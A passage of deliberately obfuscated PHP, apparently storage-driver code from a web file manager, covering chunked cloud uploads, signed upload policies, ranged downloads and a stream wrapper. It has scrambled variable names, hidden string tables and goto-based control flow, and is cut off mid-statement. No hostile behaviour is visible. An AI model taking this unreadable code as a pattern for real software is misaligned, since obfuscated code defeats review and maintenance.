$this->tempFile($this->pathThis($F²ŞÈ›Ã”‘)); file_put_contents($Eà„Ç¤©„, $aĞ·ÍÔº“æ); if ($this->upload($F²ŞÈ›Ã”‘, $Eà„Ç¤©„)) { $this->tempFileRemve($Eà„Ç¤©„); return !0; } return !1; } public function fileSubstr($fáÖÃ£Œ¨Ì, $AÈõÒ¾­ÖË, $Bß–ëùÂéŠ) { $D÷Öâë¹Ñ– =& $_SERVER[Ö‘Øù]; if (!($cøƒĞ§å±› = $this->link($fáÖÃ£Œ¨Ì))) { return !1; } $DÅ¶åğ•Ïé = !1; if ($Bß–ëùÂéŠ > 0) { $aÄ—§µ´§İ = $AÈõÒ¾­ÖË + $Bß–ëùÂéŠ - 1; $DÅ¶åğ•Ïé = array($D÷Öâë¹Ñ–[1342] . $AÈõÒ¾­ÖË . $D÷Öâë¹Ñ–[455] . $aÄ—§µ´§İ); } $bòŠ‘æ¼¦Ğ = url_request($cøƒĞ§å±›, $D÷Öâë¹Ñ–[228], !1, $DÅ¶åğ•Ïé); return $bòŠ‘æ¼¦Ğ[$D÷Öâë¹Ñ–[743]] ? $bòŠ‘æ¼¦Ğ[$D÷Öâë¹Ñ–[1122]] : !1; } public function upload($f„»Ş“ñ, $FÏâ¦è°âª, $Fä–©Ÿ“ŞÛ = false, $C‰½ê„–ÁŠ = REPEAT_REPLACE) { goto A­ÑÒä‹÷Š; BÏ—ÃÉ÷ìÇ: $EÀØ¿†ñ¯ˆ = $this->ussRequest($f„»Ş“ñ, $f•âÇ¥ÉêŒ[226], !1, $A±¼ªË³ê‰); return $EÀØ¿†ñ¯ˆ[$f•âÇ¥ÉêŒ[1120]] ? $this->getPathOuter($b‘ôÕ›®°) : !1; goto dõ±”èßô“; Eˆ·àÎÉøã: if (!$EÀØ¿†ñ¯ˆ[$f•âÇ¥ÉêŒ[1120]]) { return !1; } $D…À¯¹‰ôš = $EÀØ¿†ñ¯ˆ[$f•âÇ¥ÉêŒ[1122]]; $aáÌÂíá… = 0; goto cãÀ ¥·ÍŞ; BÕƒèñ²Æó: do { $F‰§éˆš‡ = $D…À¯¹‰ôš[$f•âÇ¥ÉêŒ[1388]]; fseek_64($F¯îóÚ’¸¢, $aáÌÂíá…); $fÕ½Ò¨·Â£ = fread($F¯îóÚ’¸¢, $F‰§éˆš‡); $fäÇ„§ë• = 0; do { $fäÇ„§ë•++; $D…À¯¹‰ôš = $this->uploadPart($f„»Ş“ñ, $D…À¯¹‰ôš, $fÕ½Ò¨·Â£); } while (!$D…À¯¹‰ôš && $fäÇ„§ë• < 3); if (!$D…À¯¹‰ôš) { return !1; } $aëˆ‚ËåÖ = $D…À¯¹‰ôš[$f•âÇ¥ÉêŒ[1387]]; $aáÌÂíá… += $F‰§éˆš‡; } while ($aëˆ‚ËåÖ != -1); fclose($F¯îóÚ’¸¢); $A±¼ªË³ê‰ = array($f•âÇ¥ÉêŒ[1389], $f•âÇ¥ÉêŒ[1390] . $D…À¯¹‰ôš[$f•âÇ¥ÉêŒ[1391]], $f•âÇ¥ÉêŒ[1385]); goto BÏ—ÃÉ÷ìÇ; F‹ˆÊˆ¬–: $bóµÜ‚¢ğ = 1024 * 1024 * 10; $A±¼ªË³ê‰ = array($f•âÇ¥ÉêŒ[1383], $f•âÇ¥ÉêŒ[1384] . $CÂËá†Şñ±, $f•âÇ¥ÉêŒ[1385], $f•âÇ¥ÉêŒ[1386] . $bóµÜ‚¢ğ); $EÀØ¿†ñ¯ˆ = $this->ussRequest($f„»Ş“ñ, $f•âÇ¥ÉêŒ[226], !1, $A±¼ªË³ê‰); goto Eˆ·àÎÉøã; A­ÑÒä‹÷Š: $f•âÇ¥ÉêŒ =& $_SERVER[Ö‘Øù]; $CÂËá†Şñ± = IO::size($FÏâ¦è°âª); if ($CÂËá†Şñ± <= 1024 * 1024 * 200) { $aßå˜¨ìÌÕ = array($f•âÇ¥ÉêŒ[1382] . $FÏâ¦è°âª); $EÀØ¿†ñ¯ˆ = $this->ussRequest($f„»Ş“ñ, $f•âÇ¥ÉêŒ[226], $aßå˜¨ìÌÕ); return $EÀØ¿†ñ¯ˆ[$f•âÇ¥ÉêŒ[1120]] ? $this->getPathOuter($f„»Ş“ñ) : !1; } goto F‹ˆÊˆ¬–; cãÀ ¥·ÍŞ: $aëˆ‚ËåÖ = $D…À¯¹‰ôš[$f•âÇ¥ÉêŒ[1387]]; $F¯îóÚ’¸¢ = fopen($FÏâ¦è°âª, $f•âÇ¥ÉêŒ[1293]); if (!$F¯îóÚ’¸¢) { return !1; } goto BÕƒèñ²Æó; dõ±”èßô“: } private function uploadPart($AÚôÕ©æ¹•, $cÂ˜åœ¿Òç, &$AÊœ‘ÊŒİ“) { $CÆ¼­¤éà =& $_SERVER[Ö‘Øù]; $AóîÍäˆ¶¦ = array($CÆ¼­¤éà[1392], $CÆ¼­¤éà[1390] . $cÂ˜åœ¿Òç[$CÆ¼­¤éà[1391]], $CÆ¼­¤éà[1393] . $cÂ˜åœ¿Òç[$CÆ¼­¤éà[1387]], $CÆ¼­¤éà[141] . $cÂ˜åœ¿Òç[$CÆ¼­¤éà[1388]]); $cÛÀ³¸´‡ = $this->ussRequest($AÚôÕ©æ¹•, $CÆ¼­¤éà[226], $AÊœ‘ÊŒİ“, $AóîÍäˆ¶¦); return !$cÛÀ³¸´‡[$CÆ¼­¤éà[1120]] ? $cÛÀ³¸´‡[$CÆ¼­¤éà[1120]] : $cÛÀ³¸´‡[$CÆ¼­¤éà[1122]]; } public function uploadFormData($CÊáÕø‡©ì, $a²Ç‹†« = 3600) { return $this->uploadPolicy($CÊáÕø‡©ì, $a²Ç‹†«); } public function multiUploadFormData($CÁŞÛÑà”¥, $aôÒÁößƒ÷ = 3600) { $E¹§öË–ˆ =& $_SERVER[Ö‘Øù]; $Cëµ¶áÇÄŸ = (int) $GLOBALS[$E¹§öË–ˆ[7]][$E¹§öË–ˆ[78]]; return $this->uploadPolicy($CÁŞÛÑà”¥, $aôÒÁößƒ÷, $Cëµ¶áÇÄŸ); } private function uploadPolicy($DŸÑÂÙ³ä, $a–—°÷Øğ· = 3600, $fÃ×‹É·±É = 0) { goto a÷ä š¦‡; d«‘â¦ïĞ©: $CŠ¹Å¢Æœ = array($aô•â«ßÚ‚[1394] => $this->bucket, $aô•â«ßÚ‚[1395] => $DŸÑÂÙ³ä, $aô•â«ßÚ‚[1396] => time() + $a–—°÷Øğ·, $aô•â«ßÚ‚[1397] => $C¹§–ë™Ç); if ($fÃ×‹É·±É) { $CŠ¹Å¢Æœ[$aô•â«ßÚ‚[1309]] = $fÃ×‹É·±É; } $F‰é‹ó’ó = base64_encode(json_encode($CŠ¹Å¢Æœ)); goto D¦ØÇ­Ò¸; D¦ØÇ­Ò¸: $AĞ®àä˜˜ = base64_encode(hash_hmac($aô•â«ßÚ‚[1364], "\120\x4f\x53\124\x26{$c§±‹ÁõÎî}\46{$C¹§–ë™Ç}\x26{$F‰é‹ó’ó}", md5("{$this->userpass}"), !0)); $dä›™Şâô… = array($aô•â«ßÚ‚[1235] => $F‰é‹ó’ó, $aô•â«ßÚ‚[1398] => "\x55\x50\131\125\x4e\x20{$this->username}\x3a{$AĞ®àä˜˜}", $aô•â«ßÚ‚[175] => $this->endpoint . $c§±‹ÁõÎî); return $dä›™Şâô…; goto e—–šÔğ¯; a÷ä š¦‡: $aô•â«ßÚ‚ =& $_SERVER[Ö‘Øù]; $c§±‹ÁõÎî = $aô•â«ßÚ‚[8] . $this->bucket; $C¹§–ë™Ç = gmdate($aô•â«ßÚ‚[1329]); goto d«‘â¦ïĞ©; e—–šÔğ¯: } public function download($f—‹°»Æ©ß, $B©ˆ¶ãØáö) { goto eÈùôš®ã; eÈùôš®ã: $c³£®Çôê‘ = IO::getPathInner(IO::mkfile($B©ˆ¶ãØáö)); if (!($eš“¾¸øë = $this->link($f—‹°»Æ©ß))) { return !1; } $aàæùÃÁìí = 0; goto B¯å¾·İ²¹; B¯å¾·İ²¹: $eÌÒçÑË½ê = 1024 * 200; $bà«À„øî› = fopen($c³£®Çôê‘, $_SERVER[Ö‘Øù][1348]); while (!0) { $A·ñº‘¤Ÿ¦ = $this->fileSubstr($f—‹°»Æ©ß, $aàæùÃÁìí, $eÌÒçÑË½ê); if ($A·ñº‘¤Ÿ¦ === !1) { return !1; } fwrite($bà«À„øî›, $A·ñº‘¤Ÿ¦); $aàæùÃÁìí += $eÌÒçÑË½ê; if (strlen($A·ñº‘¤Ÿ¦) < $eÌÒçÑË½ê) { break; } } goto bÔãÉåé»Õ; bÔãÉåé»Õ: fclose($bà«À„øî›); return $B©ˆ¶ãØáö; goto B÷½³±ôÁè; B÷½³±ôÁè: } public function link($EÁÇ¢ãâ½‰, $dÂ•Ì†äÌ¥ = array()) { $EÛáë‘Èì =& $_SERVER[Ö‘Øù]; $EÁÇ¢ãâ½‰ = trim($EÁÇ¢ãâ½‰, $EÛáë‘Èì[8]); if (!empty($this->token)) { $BÎ—¨ÕÆ×³ = strtotime(date($EÛáë‘Èì[1399])); $Eº²ŠÎØî = substr(md5($this->token . $EÛáë‘Èì[282] . $BÎ—¨ÕÆ×³ . $EÛáë‘Èì[1400] . $EÁÇ¢ãâ½‰), 12, 8) . $BÎ—¨ÕÆ×³; $dÂ•Ì†äÌ¥[] = $EÛáë‘Èì[1401] . $Eº²ŠÎØî; } $F´ö”†‘Î§ = !empty($dÂ•Ì†äÌ¥) ? $EÛáë‘Èì[70] . implode($EÛáë‘Èì[282], $dÂ•Ì†äÌ¥) : $EÛáë‘Èì[33]; return $this->getHost() . $EÛáë‘Èì[8] . $EÁÇ¢ãâ½‰ . $F´ö”†‘Î§; } public function fileOut($b—êâ´ñœÎ, $Bö™ÚîÓæÛ = false, $EåÈ•Ë•ç… = false, $A¶£×µ‘– = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b—êâ´ñœÎ, $Bö™ÚîÓæÛ, $EåÈ•Ë•ç…, $A¶£×µ‘–); } if (!$EåÈ•Ë•ç…) { $EåÈ•Ë•ç… = $this->pathThis($b—êâ´ñœÎ); } $F¾Ïˆ¨˜ã = $Bö™ÚîÓæÛ ? array($_SERVER[Ö‘Øù][1402] . rawurlencode($EåÈ•Ë•ç…)) : array(); $b„Á¶µ´Ÿ› = $this->link($b—êâ´ñœÎ, $F¾Ïˆ¨˜ã); $this->fileOutLink($b„Á¶µ´Ÿ›); } public function fileOutServer($AÆ’ÄÇÄøÌ, $F‡÷ëã•ˆ· = false, $D±º‰‰µ© = false, $AéåÄ…ùÂæ = '') { parent::fileOut($AÆ’ÄÇÄøÌ, $F‡÷ëã•ˆ·, $D±º‰‰µ©, $AéåÄ…ùÂæ); } public function fileOutImage($f”½°†æÑß, $a­Òø•ÉÔ… = 250) { $e‹Û–ö±¡ = $this->link($f”½°†æÑß . $_SERVER[Ö‘Øù][1403] . $a­Òø•ÉÔ…); $this->fileOutLink($e‹Û–ö±¡); } public function fileOutImageServer($e·ÁÙÉ¹Ñ, $aŸ†ğÉ™„ì = 250) { parent::fileOutImage($e·ÁÙÉ¹Ñ, $aŸ†ğÉ™„ì); } public function hashMd5($fºî§”é‚) { $FîŸÎ“”Ô¿ =& $_SERVER[Ö‘Øù]; $bÏŒù¯ˆîĞ = $this->_objectMeta($fºî§”é‚); return isset($bÏŒù¯ˆîĞ[$FîŸÎ“”Ô¿[208]]) ? $bÏŒù¯ˆîĞ[$FîŸÎ“”Ô¿[208]] : !1; } public function size($F«Ô…îÓÅÆ) { $D‰Ü‰Å÷Ùé = $this->objectMeta($F«Ô…îÓÅÆ); return $D‰Ü‰Å÷Ùé ? $D‰Ü‰Å÷Ùé[$_SERVER[Ö‘Øù][78]] : 0; } public function info($b‡ØàÕ¸Åà) { if ($this->isFolder($b‡ØàÕ¸Åà)) { return $this->folderInfo($b‡ØàÕ¸Åà); } else { if ($this->isFile($b‡ØàÕ¸Åà)) { return $this->fileInfo($b‡ØàÕ¸Åà); } } return !1; } public function exist($e‰ÒÏ¬Şµ) { return $this->isFile($e‰ÒÏ¬Şµ) || $this->isFolder($e‰ÒÏ¬Şµ); } public function isFile($F¤¦……·) { return !$this->isFolder($F¤¦……·) && $this->objectMeta($F¤¦……·); } public function isFolder($A¸ëéÒ´˜ ) { return $this->cacheMethod($_SERVER[Ö‘Øù][199], $A¸ëéÒ´˜ ); } protected function objectMeta($A¦„§ŸÖš) { return $this->cacheMethod($_SERVER[Ö‘Øù][200], $A¦„§ŸÖš); } protected function _objectMeta($DóçÑŠñê†) { goto fµ÷î¤Ö‰Ù; cÚÙÅ›ô²¥: if (!$F¡Ûêòˆ–[$C£¡ÉÃ„†‹[1120]]) { return null; } $dŒñ”Í‹¦¤ = isset($F¡Ûêòˆ–[$C£¡ÉÃ„†‹[1122]]) ? $F¡Ûêòˆ–[$C£¡ÉÃ„†‹[1122]] : array(); if (!isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1405]])) { return null; } goto F¦¢ÑÔŞä²; F¦¢ÑÔŞä²: $BŸÍä² ±¿ = array($C£¡ÉÃ„†‹[29] => isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1405]]) ? $dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1405]] : null, $C£¡ÉÃ„†‹[78] => isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1406]]) ? $dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1406]] : null, $C£¡ÉÃ„†‹[208] => isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1407]]) ? $dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1407]] : null, $C£¡ÉÃ„†‹[1374] => isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1408]]) ? $dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1408]] : null); $BŸÍä² ±¿[$C£¡ÉÃ„†‹[1375]] = isset($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1409]]) ? strtotime($dŒñ”Í‹¦¤[$C£¡ÉÃ„†‹[1409]]) : $BŸÍä² ±¿[$C£¡ÉÃ„†‹[1374]]; return $BŸÍä² ±¿; goto cÏ·èö‚–; fµ÷î¤Ö‰Ù: $C£¡ÉÃ„†‹ =& $_SERVER[Ö‘Øù]; if ($DóçÑŠñê† == $C£¡ÉÃ„†‹[33] || $DóçÑŠñê† == $C£¡ÉÃ„†‹[8]) { return array(); } $F¡Ûêòˆ– = $this->ussRequest($DóçÑŠñê†, $C£¡ÉÃ„†‹[1404]); goto cÚÙÅ›ô²¥; cÏ·èö‚–: } protected function _isFolder($C–êÃ‰À”) { $Aœ¦–¼…«ï =& $_SERVER[Ö‘Øù]; if ($C–êÃ‰À” == $Aœ¦–¼…«ï[33] || $C–êÃ‰À” == $Aœ¦–¼…«ï[8]) { return !0; } $fæá³¯¡› = $this->_objectMeta($C–êÃ‰À”); return isset($fæá³¯¡›[$Aœ¦–¼…«ï[29]]) && $fæá³¯¡›[$Aœ¦–¼…«ï[29]] == $Aœ¦–¼…«ï[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($bÁÁìƒÑÏ = false) { } public function exist($F÷Û„¼œÆ) { $CÛ­””³‰¼ = $this->info($F÷Û„¼œÆ); return $CÛ­””³‰¼[$_SERVER[Ö‘Øù][195]]; } public function isFile($b÷†Î‹†º©) { $d„Óë²­« = $this->info($b÷†Î‹†º©); return $d„Óë²­«[$_SERVER[Ö‘Øù][195]]; } public function isFolder($B¼ÕÛÄÂ¡¨) { return !1; } public function size($eÀ…åÜ¹‚) { $CìÂ§©ÛÏô = $this->info($eÀ…åÜ¹‚); return $CìÂ§©ÛÏô[$_SERVER[Ö‘Øù][78]]; } public function info($a È»ÚÓ¾ƒ) { return $this->infoParse($a È»ÚÓ¾ƒ); } public function infoAuth($e×‘ºÕ«ˆÜ) { return $this->infoParse($e×‘ºÕ«ˆÜ); } public function infoWithChildren($dĞØç‡òÜó) { return $this->infoParse($dĞØç‡òÜó); } public function infoFull($FÛšêº—„) { return $this->infoParse($FÛšêº—„); } private function infoParse($eÛÕ‰ñŒº) { $B¼×â…Ø¸ =& $_SERVER[Ö‘Øù]; $b§Ñ“§£ = $this->header($eÛÕ‰ñŒº); if (!$b§Ñ“§£ || !$b§Ñ“§£[$B¼×â…Ø¸[743]]) { return !1; } $e­¢Öˆò° = _get($b§Ñ“§£, $B¼×â…Ø¸[335], 0); $Aç†‚á˜¿» = array($B¼×â…Ø¸[28] => $b§Ñ“§£[$B¼×â…Ø¸[28]], $B¼×â…Ø¸[76] => $eÛÕ‰ñŒº, $B¼×â…Ø¸[29] => $B¼×â…Ø¸[193], $B¼×â…Ø¸[78] => intval($e­¢Öˆò°), $B¼×â…Ø¸[168] => get_path_ext($b§Ñ“§£[$B¼×â…Ø¸[28]]), $B¼×â…Ø¸[1290] => $e­¢Öˆò° > 0 && $b§Ñ“§£[$B¼×â…Ø¸[1410]], $B¼×â…Ø¸[1291] => !1); return $Aç†‚á˜¿»; } private function header($C‘òÓØ‘‰Š) { goto EéÖ¦’ÜœË; EÖÊËŠ±â‡: $GLOBALS[$AÏƒæ«¿Á—[1411]] = !0; self::$_cacheHeader[$C‘òÓØ‘‰Š] = url_header($C‘òÓØ‘‰Š); $GLOBALS[$AÏƒæ«¿Á—[1411]] = $EÑ…çÅÍ¸í; goto A»è§¦­ˆ‘; EéÖ¦’ÜœË: $AÏƒæ«¿Á— =& $_SERVER[Ö‘Øù]; if (isset(self::$_cacheHeader[$C‘òÓØ‘‰Š])) { return self::$_cacheHeader[$C‘òÓØ‘‰Š]; } $EÑ…çÅÍ¸í = isset($GLOBALS[$AÏƒæ«¿Á—[1411]]) ? $GLOBALS[$AÏƒæ«¿Á—[1411]] : !1; goto EÖÊËŠ±â‡; A»è§¦­ˆ‘: return self::$_cacheHeader[$C‘òÓØ‘‰Š]; goto C‹…ÊÒŒ‹º; C‹…ÊÒŒ‹º: } public function hashSimple($c¢¸ÃêÛ÷ç, $f³¥Ğ™ù— = false) { goto EÀøˆ³†Å; EÀøˆ³†Å: $A‰¾ß¡„ =& $_SERVER[Ö‘Øù]; $CÛí¤²í¶Ñ = $this->info($c¢¸ÃêÛ÷ç); if (!$CÛí¤²í¶Ñ || !$CÛí¤²í¶Ñ[$A‰¾ß¡„[195]]) { return !1; } goto cŞ®±¬ˆß¦; cŞ®±¬ˆß¦: $E‚Ê­™µÁ† = $CÛí¤²í¶Ñ[$A‰¾ß¡„[78]]; $F¤—Ëá›‘Ê = 200; $DÄ™ÚÎ‚±º = 50; goto céæ‡Ä¼“; cÊµˆÃ¿•İ: $BÚ¦¦ã„´ .= $this->fileSubstr($c¢¸ÃêÛ÷ç, $E‚Ê­™µÁ† - $F¤—Ëá›‘Ê, $F¤—Ëá›‘Ê); return md5($BÚ¦¦ã„´) . $E‚Ê­™µÁ†; goto eŞµ”ˆ¸; f‰óÅÄö—¢: $aŒ„£¡¶ø¸ = timeFloat(); $Fô­ËØ¦Æ = 15; for ($AˆÚæÑÖ·‚ = 0; $AˆÚæÑÖ·‚ < $DÄ™ÚÎ‚±º; $AˆÚæÑÖ·‚++) { if (timeFloat() - $aŒ„£¡¶ø¸ > $Fô­ËØ¦Æ) { return !1; } $dËèÜŞ = $this->fileSubstr($c¢¸ÃêÛ÷ç, $e¿™†°“‰Ğ * $AˆÚæÑÖ·‚, $F¤—Ëá›‘Ê); if (!$dËèÜŞ) { return !1; } $BÚ¦¦ã„´ .= $dËèÜŞ; } goto cÊµˆÃ¿•İ; céæ‡Ä¼“: if ($E‚Ê­™µÁ† <= $F¤—Ëá›‘Ê * $DÄ™ÚÎ‚±º) { return md5($this->fileSubstr($c¢¸ÃêÛ÷ç, 0, $E‚Ê­™µÁ†)) . $E‚Ê­™µÁ†; } $e¿™†°“‰Ğ = intval($E‚Ê­™µÁ† / $DÄ™ÚÎ‚±º); $BÚ¦¦ã„´ = $A‰¾ß¡„[33]; goto f‰óÅÄö—¢; eŞµ”ˆ¸: } public function getContent($D³±õ‰‰½) { return $this->fileSubstr($D³±õ‰‰½); } public function fileSubstr($A…ÇğÑøÛ, $A™«ùŞğ — = 0, $C£ÍĞ²õ·­ = -1) { goto EÈ™Ş¤âªŸ; EÈ™Ş¤âªŸ: $a©§Ø×ºòÆ =& $_SERVER[Ö‘Øù]; $Fù†É†Ç­ö = $this->info($A…ÇğÑøÛ); if (!$Fù†É†Ç­ö || !$Fù†É†Ç­ö[$a©§Ø×ºòÆ[195]] && $Fù†É†Ç­ö[$a©§Ø×ºòÆ[78]] > 1024 * 1024 * 10) { return !1; } goto fŞ¼Í¤Š ×; c²á¬’èæÑ: $E‹»†ĞÙ = url_request($A…ÇğÑøÛ, $a©§Ø×ºòÆ[228], !1, $fÓ‹ ‘Ÿİ, !1, !1, 1); return $E‹»†ĞÙ[$a©§Ø×ºòÆ[1122]] ? $E‹»†ĞÙ[$a©§Ø×ºòÆ[1122]] : $a©§Ø×ºòÆ[33]; goto BµÒÏ¨’á; fŞ¼Í¤Š ×: if ($C£ÍĞ²õ·­ === -1) { $C£ÍĞ²õ·­ = $Fù†É†Ç­ö[$a©§Ø×ºòÆ[78]]; } if ($C£ÍĞ²õ·­ == 0) { return $a©§Ø×ºòÆ[33]; } $fÓ‹ ‘Ÿİ = array($a©§Ø×ºòÆ[1412] . $A™«ùŞğ — . $a©§Ø×ºòÆ[777] . ($A™«ùŞğ — + $C£ÍĞ²õ·­ - 1)); goto c²á¬’èæÑ; BµÒÏ¨’á: } public function download($DÂÍÛ’„’, $Eâò´·ŠÎ) { Downloader::start($DÂÍÛ’„’, $Eâò´·ŠÎ); return $Eâò´·ŠÎ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($bœ‚ÏæÂ§ğ, $E××‰óÁ = '') { goto C‚¼å±âòç; bêÃ±Êæ”¨: if (!isset(self::$_chunkBuffer[$bœ‚ÏæÂ§ğ])) { self::$_chunkBuffer[$bœ‚ÏæÂ§ğ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto C‹‹ÏÒƒøÓ; AÚÓ‰Ç“˜Œ: $this->pathOpen = $bœ‚ÏæÂ§ğ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto bêÃ±Êæ”¨; C‚¼å±âòç: $this->info = $this->info($bœ‚ÏæÂ§ğ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ö‘Øù][76]]; goto AÚÓ‰Ç“˜Œ; C‹‹ÏÒƒøÓ: } function stream_read($e×ŸØ¿˜ƒ¼) { $FŸ‚³‡Ã¥ƒ = $this->fileSubstr($this->pose, $e×ŸØ¿˜ƒ¼); $this->pose += strlen($FŸ‚³‡Ã¥ƒ); return $FŸ‚³‡Ã¥ƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($AåÙÒœ‰Ï¢, $fÎö¹™×ËŒ) { $Aè¯µ¿¨”ì =& $_SERVER[Ö‘Øù]; if ($fÎö¹™×ËŒ == SEEK_SET) { $this->pose = $AåÙÒœ‰Ï¢; } else { if ($fÎö¹™×ËŒ == SEEK_CUR) { $this->pose += $AåÙÒœ‰Ï¢; } else { if ($fÎö¹™×ËŒ == SEEK_END) { $this->pose = $this->info[$Aè¯µ¿¨”ì[78]] + intval($AåÙÒœ‰Ï¢); } } } if ($AåÙÒœ‰Ï¢ < 0) { $this->pose = $this->info[$Aè¯µ¿¨”ì[78]] + $AåÙÒœ‰Ï¢; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ö‘Øù][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($d‚Ò•ö»’, $e´µêò™¢) { $fµ•ªè‘‘§ =& $_SERVER[Ö‘Øù]; $FîÃ¡Ô‘å‹ = $this->info($d‚Ò•ö»’); return array($fµ•ªè‘‘§[1413] => 0, $fµ•ªè‘‘§[1414] => 0, $fµ•ªè‘‘§[12] => 32768 + 511, $fµ•ªè‘‘§[1415] => 0, $fµ•ªè‘‘§[1416] => 0, $fµ•ªè‘‘§[1417] => 0, $fµ•ªè‘‘§[1418] => 0, $fµ•ªè‘‘§[78] => $FîÃ¡Ô‘å‹[$fµ•ªè‘‘§[78]], $fµ•ªè‘‘§[1419] => $FîÃ¡Ô‘å‹[$fµ•ªè‘‘§[1289]], $fµ•ªè‘‘§[1375] => $FîÃ¡Ô‘å‹[$fµ•ªè‘‘§[84]], $fµ•ªè‘‘§[1374] => $FîÃ¡Ô‘å‹[$fµ•ªè‘‘§[194]], $fµ•ªè‘‘§[1420] => 0, $fµ•ªè‘‘§[1421] => 0); } static $fileInfo = array(); public function info($AƒÕ©ªÊ©) { $fù‡ƒ‹ê»È = $_SERVER[Ö‘Øù][1422]; if (isset(self::$fileInfo[$AƒÕ©ªÊ©])) { return self::$fileInfo[$AƒÕ©ªÊ©]; } if (substr($AƒÕ©ªÊ©, 0, strlen($fù‡ƒ‹ê»È)) != $fù‡ƒ‹ê»È) { return !1; } self::$fileInfo[$AƒÕ©ªÊ©] = IO::info(substr($AƒÕ©ªÊ©, strlen($fù‡ƒ‹ê»È))); return self::$fileInfo[$AƒÕ©ªÊ©]; } public static function read($E½‹òÕÒƒ², $C××ªÒÓ«, $FŒ˜³íÍˆã) { if (!isset(self::$_fopenCache[$E½‹òÕÒƒ²])) { $a³ãŒ½æˆ = new StreamWrapperIO(); $a³ãŒ½æˆ->stream_open($E½‹òÕÒƒ²); self::$_fopenCache[$E½‹òÕÒƒ²] = $a³ãŒ½æˆ; } $a³ãŒ½æˆ = self::$_fopenCache[$E½‹òÕÒƒ²]; return $a³ãŒ½æˆ->fileSubstr($C××ªÒÓ«, $FŒ˜³íÍˆã); } public static function _read($e®¥÷‘…Ôê, $bìÃ©†ß·Ó, $eö½ßš³) { goto e¥Œ²ª¿ó; e¥Œ²ª¿ó: $bÃâÙÌ¡¿‚ =& $_SERVER[Ö‘Øù]; $B½ÚÉíğ½½ = fopen($e®¥÷‘…Ôê, $bÃâÙÌ¡¿‚[1293]); if (!$B½ÚÉíğ½½) { return $bÃâÙÌ¡¿‚[33]; } goto Bµ£Ü±£™…; C—ôÆ¬š…ì: $dÈâ…óç²è = 0; while ($dÈâ…óç²è < $eö½ßš³) { $cæ¼•İªãÙ = min($bòíƒ”ô†¿, $eö½ßš³ - $dÈâ…óç²è); $CŒÒÜ¥šùù .= fread($B½ÚÉíğ½½, $cæ¼•İªãÙ); $dÈâ…óç²è += $cæ¼•İªãÙ; } fclose($B½ÚÉíğ½½); goto F¹‘£Ìá÷Ú; F¹‘£Ìá÷Ú: return $CŒÒÜ¥šùù; goto Bğº’„¢Îó; Bµ£Ü±£™…: $bòíƒ”ô†¿ = 8192; fseek($B½ÚÉíğ½½, $bìÃ©†ß·Ó, SEEK_SET); $CŒÒÜ¥šùù = $bÃâÙÌ¡¿‚[33]; goto C—ôÆ¬š…ì; Bğº’„¢Îó: } public function fileSubstr($d±©Ñ§ƒ°˜, $a’ÄŞƒ‡ÜÚ) { goto a…‘¨”ÀÚê; DÉøŒÈ‘›Ç: $bÈ’È©ö‘Ğ = ceil(($d±©Ñ§ƒ°˜ + $a’ÄŞƒ‡ÜÚ) / $CŒÜµÍéğ¸) * $CŒÜµÍéğ¸ - $Fº·ÍØ÷›Ÿ; $FŞÏ–®ÓÑö = IO::fileSubstr($this->path, $Fº·ÍØ÷›Ÿ, $bÈ’È©ö‘Ğ); $d‹ëÏÍ¾š©[$Fº·ÍØ÷›Ÿ . $FÅ÷—¥ğÁà[33]] = $FŞÏ–®ÓÑö; goto cŠæëÙä•; Eæ®çÉÚù¡: $fô¥È¤ÏŞÚ = $a’ÄŞƒ‡ÜÚ; if ($d±©Ñ§ƒ°˜ < 0) { $d±©Ñ§ƒ°˜ = $B¦¯ÆŞ«Ÿ¬ + $d±©Ñ§ƒ°˜; } if ($a’ÄŞƒ‡ÜÚ === !1) { $a’ÄŞƒ‡ÜÚ = $B¦¯ÆŞ«Ÿ¬ - $d±©Ñ§ƒ°˜; } goto A”ÊëªÏ; Cø•…•Ú”Ã: $E‰ÎÊÆ«Ğ = 0; $AÇ‰ª¤¯ÄÄ = 0; $a°„Š¢ö‘¦ = $FÅ÷—¥ğÁà[33]; goto aêÛÙÈ³óè; cŠæëÙä•: ksort($d‹ëÏÍ¾š©); $b¢¯Ô‹³İ¦ = substr($FŞÏ–®ÓÑö, $d±©Ñ§ƒ°˜ - $Fº·ÍØ÷›Ÿ, $a’ÄŞƒ‡ÜÚ); return $b¢¯Ô‹³İ¦; goto AØíïóš´×; A”ÊëªÏ: if ($d±©Ñ§ƒ°˜ + $a’ÄŞƒ‡ÜÚ > $B¦¯ÆŞ«Ÿ¬) { $a’ÄŞƒ‡ÜÚ = $B¦¯ÆŞ«Ÿ¬ - $d±©Ñ§ƒ°˜; } if ($a’ÄŞƒ‡ÜÚ <= 0) { return $FÅ÷—¥ğÁà[33]; } if ($d±©Ñ§ƒ°˜ < 0 || $d±©Ñ§ƒ°˜ >= $B¦¯ÆŞ«Ÿ¬ || $a’ÄŞƒ‡ÜÚ <= 0 || $a’ÄŞƒ‡ÜÚ > 1024 * 1024 * 10) { throw new 